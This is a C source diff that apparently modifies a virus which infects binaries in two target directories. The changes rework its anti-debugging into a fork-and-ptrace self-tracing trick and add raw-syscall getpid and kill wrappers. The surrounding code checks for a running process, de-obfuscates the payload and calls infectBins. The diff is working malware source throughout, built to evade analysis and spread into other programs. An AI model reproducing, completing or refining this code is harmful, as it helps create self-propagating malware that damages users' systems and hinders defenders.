@@ -10,15 +10,21 @@ int   entry_point(void *magic) {
 
   if (checkProcess(procName) != 0)
     return (stop(1, magic));
-  if ((ret = preventDebug()) == -1)
+  if ((ret = preventDebug(magic)) == -1)
     return (stop(1, magic));
   if (ret == 1)
     return (stop(0, magic));
-  if (magic != (void *)0x42)
-    if (unObfuscate() == -1)
+  if (magic != (void *)0x42) {
+    if (unObfuscate() == -1) {
+      if (magic == (void *)0x42)
+        return (stop(1, magic));
       exit(1);
+    }
+  }
   infectBins(infectDir);
   infectBins(infectDir2);
+  if (magic == (void *)0x42)
+    return (stop(0, magic));
   exit(0);
 }
 
@@ -227,6 +233,26 @@ static pid_t  waitpid(pid_t pid, int *stat_loc, int options) {
   return (ret);
 }
 
+static pid_t  getpid(void) {
+  register pid_t  ret   asm("rax");
+  register int8_t  rax  asm("rax") = 39;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
+static int    raise(int sig, pid_t pid) {
+  register int    ret   asm("rax");
+  register int    rax asm("rax") = 200;
+  register pid_t  rdi asm("rdi") = pid;
+  register int    rsi asm("rsi") = sig;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
 static void *memcpy(void *dest, const void *src, size_t n) {
   while (n != 0) {
     n -= 1;
@@ -414,30 +440,32 @@ static int  checkProcess(char *dirname) {
   return (0);
 }
 
-static int   preventDebug(void) {
+static int   preventDebug(void *magic) {
   pid_t pid;
+  int   status;
 
-  if ((pid = fork()) != 0) {
-    if (pid < 0)
-      return (-1);
-    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
-      kill(pid, 9);
-      return (-1);
-    }
-    if (waitpid(pid, 0, 0) < 0) {
-      kill(pid, 9);
-      return (-1);
-    }
-    ptrace(PTRACE_CONT, pid, 0, 0);
-    if (waitpid(pid, 0, 0) < 0) {
-      kill(pid, 9);
-      return (-1);
-    }
-    return (1);
-  } else {
-    asm("int3");
+  if (magic == (void *)0x42) {
     if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0)
-      exit(1);
+      return (-1);
+  } else {
+    if ((pid = fork()) != 0) {
+      if (pid < 0)
+        return (-1);
+      if (waitpid(pid, 0, WUNTRACED) < 0) {
+        kill(pid, 9);
+        return (-1);
+      }
+      if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
+        kill(pid, 9);
+        return (-1);
+      }
+      while (waitpid(pid, &status, WCONTINUED) >= 0) {
+        if (__WIFSTOPPED(status))
+          ptrace(PTRACE_CONT, pid, 0, 0);
+      }
+      return (1);
+    } else
+      raise(SIGSTOP, getpid());
   }
   return (0);
 }
